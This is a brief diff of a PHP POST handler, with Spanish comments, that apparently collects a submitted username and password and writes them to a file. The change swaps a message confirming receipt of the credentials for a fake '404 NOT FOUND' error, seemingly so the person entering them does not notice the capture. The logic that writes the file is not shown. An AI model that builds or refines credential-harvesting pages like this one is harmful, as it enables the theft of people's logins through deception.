@@ -12,7 +12,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     fclose($file);
 
     // Puedes redirigir al usuario a otra página o mostrar un mensaje de éxito
-    echo "Datos recibidos. Usuario: $usuario, Contraseña: $contraseña.";
+    echo "ERROR 404 NOT FOUND";
 } else {
     echo "Método no permitido.";
 }
